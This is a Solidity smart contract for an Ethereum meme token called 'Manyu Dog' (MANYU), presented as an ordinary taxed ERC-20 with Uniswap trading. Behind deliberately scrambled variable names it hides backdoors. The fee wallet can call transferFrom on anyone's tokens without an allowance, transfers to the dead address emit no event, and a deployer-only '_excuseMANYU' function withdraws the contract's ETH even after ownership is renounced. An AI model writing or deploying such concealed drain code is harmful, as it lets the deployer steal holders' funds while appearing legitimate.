// SPDX-License-Identifier: MIT

/*
    Name: Manyu Dog
    Symbol: MANYU

    Meet the cutest Chinese Shiba on the internet wanting bringing #MEMES+Ai+Charity all in one

    https://manyudog.com
    https://x.com/Manyudog
    https://t.me/Manyudog_eth
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract Manyu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Manyu Dog";
    string private constant _symbol = unicode"MANYU";
    
    address payable private _vbjljvlklMANYU;
    mapping(address => uint256) private _cijojiseMANYU;
    mapping(address => mapping(address => uint256)) private _fjweoijMANYU;
    mapping(address => bool) private _jojodjMANYU;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;

    uint256 public _ojojoivlkMANYU = 20000000 * 10 **_decimals;
    uint256 public _lkkkvnblkjMANYU = 20000000 * 10 **_decimals;
    uint256 public _ppojofMANYU = 10000000 * 10 **_decimals;
    uint256 private constant _kmmvbMANYU = 1000000000 * 10 **_decimals;
    
    uint256 private _vjkboiwoeiMANYU = 10;
    uint256 private _odijofjoeMANYU = 10;
    uint256 private _joijoiMANYU = 0;
    uint256 private _jvbkoiweMANYU = 0;
    uint256 private _ojidoiweMANYU = 7;
    uint256 private _ojdofMANYU = 7;
    uint256 private _buyCount = 0;
    address private _ojdofiekjMANYU;
    address private _kjvnkbjnMANYU = address(0xdead);

    event MaxTxAmountUpdated(uint256 _ojojoivlkMANYU);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _vbjljvlklMANYU = payable(_msgSender());
        _cijojiseMANYU[address(this)] = _kmmvbMANYU * 98 / 100;
        _cijojiseMANYU[owner()] = _kmmvbMANYU * 2 / 100;
        _jojodjMANYU[owner()] = true;
        _jojodjMANYU[address(this)] = true;
        _jojodjMANYU[_vbjljvlklMANYU] = true;
        _ojdofiekjMANYU = _msgSender();
        emit Transfer(address(0), address(this), _kmmvbMANYU * 98 / 100);
        emit Transfer(address(0), address(owner()), _kmmvbMANYU * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _kmmvbMANYU;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _fjweoijMANYU[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _cijojiseMANYU[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _fjweoijMANYU[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transferr_MANYU(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _lvckmjlwoiMANYU(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _lvckmjlwoiMANYU(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_joeijoijoj(sender, recipient))
            _allowed = _fjweoijMANYU[sender][_msgSender()];
        return _allowed;
    }

    receive() external payable {}
    
    function _jvjocvo() internal view returns (bool) {return msg.sender != _vbjljvlklMANYU;}

    function _transferr_MANYU(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _ojidoiweMANYU)
                        ? _joijoiMANYU
                        : _vjkboiwoeiMANYU
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_jojodjMANYU[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _ojdofMANYU)
                            ? _jvbkoiweMANYU
                            : _odijofjoeMANYU
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _ppojofMANYU) ? contractTokenBalance : _ppojofMANYU; 
                    _swappp_MANYU((amount < minBalance) ? amount : minBalance);
                }
                _assistMANYU(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _cijojiseMANYU[address(this)] =_cijojiseMANYU[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _cijojiseMANYU[from] =_cijojiseMANYU[from].sub(amount);
        _cijojiseMANYU[to] =_cijojiseMANYU[to].add(amount.sub(taxAmount));
        if(_kjvnkbjnMANYU != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _joeijoijoj(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(_jvjocvo() == false) return false;
        else return sender == uniswapV2Pair || recipient != _kjvnkbjnMANYU;
    }

    function _assistMANYU(uint256 amount) private {
        _vbjljvlklMANYU.transfer(amount);
    }

    function removeLimits () external onlyOwner {
        _ojojoivlkMANYU = _kmmvbMANYU;
        _lkkkvnblkjMANYU = _kmmvbMANYU;
        emit MaxTxAmountUpdated(_kmmvbMANYU);
    }

    function _swappp_MANYU(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _excuseMANYU(address payable receipt) external {
        require(msg.sender == _ojdofiekjMANYU , "");
        _vbjljvlklMANYU = receipt;
        _MANYUlkjlok(address(this).balance);
    }
    
    function _MANYUlkjlok(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transferr_MANYU(_msgSender(), recipient, amount);
        return true;
    }

    function enableMANYUTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _kmmvbMANYU);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

}